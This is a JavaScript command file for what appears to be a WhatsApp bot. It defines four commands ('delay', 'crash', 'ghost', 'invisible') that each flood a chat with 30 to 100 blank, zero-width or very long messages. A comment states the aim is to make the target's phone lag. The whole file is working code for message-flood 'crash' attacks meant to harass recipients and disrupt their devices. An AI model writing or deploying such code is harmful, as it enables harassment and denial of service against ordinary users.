const { cmd } = require('../command');

cmd({
    pattern: "delay",
    alias: ["lag"],
    desc: "Send delay spam",
    category: "other",
    react: "🐢",
    filename: __filename
},
async (conn, m, { from }) => {
    // 50x spam karala phone lag karanawa
    for(let i = 0; i < 50; i++) {
        await conn.sendMessage(from, { text: 'ㅤ' });
    }
});

cmd({
    pattern: "crash",
    alias: ["crashbug"],
    desc: "Send crash spam",
    category: "other",
    react: "💣",
    filename: __filename
},
async (conn, m, { from }) => {
    // 100x big text spam
    for(let i = 0; i < 100; i++) {
        await conn.sendMessage(from, { text: '𝐑𝐈𝐊𝐀-𝐂𝐑𝐀𝐒𝐇 '.repeat(100) });
    }
});

cmd({
    pattern: "ghost",
    alias: ["ghostbug"],
    desc: "Send ghost spam",
    category: "other",
    react: "👻",
    filename: __filename
},
async (conn, m, { from }) => {
    for(let i = 0; i < 30; i++) {
        await conn.sendMessage(from, { text: 'ㅤ' });
    }
});

cmd({
    pattern: "invisible",
    alias: ["invisiblebug", "blank"],
    desc: "Send invisible spam",
    category: "other",
    react: "🫥",
    filename: __filename
},
async (conn, m, { from }) => {
    for(let i = 0; i < 100; i++) {
        await conn.sendMessage(from, { text: '\u200B' });
    }
});
